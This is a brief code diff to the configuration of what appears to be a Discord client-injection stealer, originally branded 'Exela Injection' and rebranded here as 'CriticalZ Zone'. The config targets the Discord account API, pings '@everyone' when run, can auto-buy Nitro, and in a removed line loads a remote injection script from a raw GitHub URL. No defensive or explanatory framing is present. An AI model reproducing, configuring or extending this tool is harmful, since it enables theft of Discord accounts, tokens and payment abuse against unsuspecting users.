@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Exela Injection', 
-  embed_icon: 'https://i.hizliresim.com/nl152du.jpg', 
+  embed_name: 'CriticalZ Zone', 
+  embed_icon: 'https://i.hizliresim.com/8ppaeb8.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/crit262/crit98/main/critical.js', 
+  injection_url: '', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
